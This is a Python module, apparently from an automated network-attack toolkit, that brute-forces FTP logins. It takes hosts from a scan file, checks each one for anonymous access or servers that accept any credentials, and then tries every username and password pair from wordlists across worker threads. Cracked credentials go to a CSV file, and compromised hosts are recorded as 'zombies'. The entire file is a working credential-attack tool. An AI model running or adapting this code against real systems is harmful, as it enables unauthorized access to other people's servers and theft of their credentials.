import os
import csv
import threading
import logging
import time
from ftplib import FTP
from queue import Queue, Empty
from shared import SharedData
from logger import Logger
from timeout_utils import (
    join_threads_with_timeout,
    drain_queue_safely
)

logger = Logger(name="ftp_connector.py", level=logging.INFO)

b_class = "FTPBruteforce"
b_module = "ftp_connector"
b_status = "brute_force_ftp"
b_port = 21
b_parent = None

class FTPBruteforce:
    """
    This class handles the FTP brute force attack process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.ftp_connector = FTPConnector(shared_data)
        logger.info("FTPConnector initialized.")

    def bruteforce_ftp(self, ip, port, mac_address='', hostname=''):
        """
        Initiates the brute force attack on the given IP and port.
        """
        return self.ftp_connector.run_bruteforce(ip, port, mac_address, hostname)

    def execute(self, ip, port, row, status_key):
        """
        Executes the brute force attack and updates the shared data status.
        """
        start_time = time.time()
        logger.lifecycle_start("FTPBruteforce", ip, port)
        self.shared_data.bjornorch_status = "FTPBruteforce"
        logger.info(f"Brute forcing FTP on {ip}:{port}...")
        # Extract hostname and MAC from the row passed by orchestrator
        hostname = row.get('Hostnames', '')
        mac_address = row.get('MAC Address', '')
        try:
            success, results = self.bruteforce_ftp(ip, port, mac_address, hostname)
            status = 'success' if success else 'no_creds_found'
        except Exception as e:
            logger.error(f"FTP bruteforce error for {ip}: {e}")
            status = 'error'
        finally:
            duration = time.time() - start_time
            logger.lifecycle_end("FTPBruteforce", status, duration, ip)
        return status

class FTPConnector:
    """
    This class manages the FTP connection attempts using different usernames and passwords.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "21")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.ftpfile = shared_data.ftpfile
        if not os.path.exists(self.ftpfile):
            logger.debug(f"Creating {self.ftpfile}")
            with open(self.ftpfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for FTP ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "21")

    def _check_anonymous_access(self, adresse_ip):
        """
        Check if the FTP server allows anonymous access.
        Returns True if anonymous access is allowed (brute force should be skipped).
        """
        import uuid

        # First try garbage credentials to detect servers that accept anything
        garbage_user = f"ftptest_{uuid.uuid4().hex[:8]}"
        garbage_pass = uuid.uuid4().hex
        try:
            conn = FTP(timeout=15)
            conn.connect(adresse_ip, 21, timeout=15)
            conn.login(garbage_user, garbage_pass)
            conn.quit()
            logger.info(f"FTP server {adresse_ip} accepts any credentials - anonymous access")
            return True, "anonymous"
        except:
            pass

        # Try standard anonymous logins
        anon_creds = [
            ("anonymous", ""),
            ("anonymous", "anonymous@"),
            ("ftp", ""),
            ("ftp", "ftp@"),
        ]
        for user, passwd in anon_creds:
            try:
                conn = FTP(timeout=15)
                conn.connect(adresse_ip, 21, timeout=15)
                conn.login(user, passwd)
                conn.quit()
                logger.info(f"FTP server {adresse_ip} allows anonymous access with {user}")
                return True, user
            except:
                pass

        return False, None

    def ftp_connect(self, adresse_ip, user, password):
        """
        Attempts to connect to the FTP server using the provided username and password.
        Uses 30 second timeout for connection.
        """
        try:
            conn = FTP(timeout=30)
            conn.connect(adresse_ip, 21, timeout=30)
            conn.login(user, password)
            conn.quit()
            logger.debug(f"FTP access on {adresse_ip} with '{user}'")
            return True
        except Exception as e:
            return False

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        Uses graceful shutdown pattern with timeout on queue.get().
        """
        while True:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break
            try:
                item = self.queue.get(timeout=1.0)
            except Empty:
                if self.queue.empty():
                    break
                continue

            adresse_ip, user, password, mac_address, hostname, port = item
            try:
                if self.ftp_connect(adresse_ip, user, password):
                    with self.lock:
                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                        logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                        success_flag[0] = True
                    # File I/O outside lock
                    self.save_results()
                    self.removeduplicates()
                    self.shared_data.record_zombie(mac_address, adresse_ip)
            finally:
                self.queue.task_done()
                with self.progress_lock:
                    self.progress_count += 1
                    if self.progress_count % 100 == 0:
                        logger.info(f"FTP brute force: {self.progress_count}/{self.progress_total}")

    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
        # Use provided mac_address and hostname from orchestrator (more reliable)
        # Fallback to lookup if not provided
        if not mac_address or not hostname:
            self.load_scan_file()
            for row in self.scan:
                if row.get('IPs') == adresse_ip:
                    if not mac_address:
                        mac_address = row.get('MAC Address', '')
                    if not hostname:
                        hostname = row.get('Hostnames', '')
                    break

        # Check for anonymous access FIRST - if allowed, skip brute force entirely
        anon_access, anon_user = self._check_anonymous_access(adresse_ip)
        if anon_access:
            logger.info(f"Marking {adresse_ip} as anonymous FTP access")
            with self.lock:
                self.results.append([mac_address, adresse_ip, hostname, anon_user or "anonymous", "", port])
            self.save_results()
            self.removeduplicates()
            self.shared_data.record_zombie(mac_address, adresse_ip)
            return True, self.results

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing FTP on {adresse_ip}... (0/{total_tasks})")

        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        # Wait for queue with exit signal checking
        queue_timeout = self.shared_data.bruteforce_queue_timeout
        queue_start = time.time()
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                drain_queue_safely(self.queue)
                break
            if time.time() - queue_start > queue_timeout:
                logger.lifecycle_timeout("FTPBruteforce", "queue processing", queue_timeout, adresse_ip)
                drain_queue_safely(self.queue)
                break
            time.sleep(0.5)

        # Give workers time to finish current items
        time.sleep(2)

        # Join threads with timeout
        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
        if hanging:
            logger.warning(f"FTP bruteforce: {len(hanging)} threads did not terminate cleanly")

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Saves the results of successful FTP connections to a CSV file.
        """
        # Ensure file exists with header
        if not os.path.exists(self.ftpfile):
            with open(self.ftpfile, 'w', newline='') as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        with open(self.ftpfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Removes duplicate entries from the results file.
        """
        rows = []
        header = None
        if os.path.exists(self.ftpfile):
            with open(self.ftpfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.ftpfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ftp_bruteforce = FTPBruteforce(shared_data)
        logger.info("Starting FTP attack on port 21...")

        # Load the IPs to scan from shared data
        ips_to_scan = shared_data.read_data()

        # Execute brute force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            ftp_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total successful attempts: {len(ftp_bruteforce.ftp_connector.results)}")
        exit(len(ftp_bruteforce.ftp_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
